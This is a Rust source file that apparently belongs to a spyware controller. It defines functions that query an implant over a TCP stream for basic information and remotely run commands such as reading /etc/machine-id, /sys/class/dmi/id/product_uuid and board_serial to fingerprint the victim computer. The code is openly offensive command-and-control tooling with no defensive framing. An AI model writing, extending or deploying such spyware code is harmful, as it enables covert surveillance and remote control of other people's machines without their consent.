use spyware_cli::commands::{ run_command, send_request };
use spyware::communication::messages::{GetBasicInfoResponse, OperatingSystem, GetBasicInfoRequest, MessageTypes, ErrorInfo};
use std::net::TcpStream;
use spyware::communication::server::get_message;
use ron;

#[derive(Debug, Fail)]
pub enum SpywareControlError {
    #[fail(display = "Could not get a computer identifier for the spyware, on OS {:?}", os)]
    FailToGetComputerIdentifier {
        os: OperatingSystem,
    },
    #[fail(display = "Could not get basic info for the spyware")]
    GetBasicSpywareInfoError {
        error_info: ErrorInfo
    }
}

pub fn get_basic_spyware_info(mut stream: &mut TcpStream) -> Result<GetBasicInfoResponse, SpywareControlError> {
    let request = GetBasicInfoRequest {
        placeholder: "".to_string()
    };
    send_request(request, stream).expect("Could not send get basic info request");
    let response = get_message(&mut stream).expect("Could not get message from stream");
    if response.message_type != MessageTypes::GetBasicInfoResponse as u8 {
        panic!(format!(
            "Got unexpected response type {}",
            response.message_type
        ));
    }
    let response: GetBasicInfoResponse = ron::de::from_bytes(&response.serialized_message).expect("Could not deserialize message");
    if response.error_info.is_none() {
        Ok(response)
    } else {
        Err(SpywareControlError::GetBasicSpywareInfoError {
            error_info: response.error_info.unwrap()
        })
    }
}

pub fn get_unique_computer_identifier(stream: &mut TcpStream) -> Result<String, SpywareControlError> {
    // TODO implement for windows and freeBSD with get basic info
    // Ways to get unique identifiers across reboots
    // On freeBSD:
    // sysctl kern.hostuuid
    // On Windows:
    let commands_to_get_id_linux = ["cat /etc/machine-id", "cat /var/lib/dbus/machine-id", "cat /sys/class/dmi/id/product_uuid", "cat /sys/class/dmi/id/board_serial"];
    for command in commands_to_get_id_linux.iter() {
        match run_command(command.to_string(), stream) {
            Ok(res) => {
                return Ok(res.output)
            },
            Err(err) => {
                println!("Could not get unique identifier running {}, got error {:?}", command, err);
            }
        }
    }
    Err(SpywareControlError::FailToGetComputerIdentifier { os: OperatingSystem::Linux })
}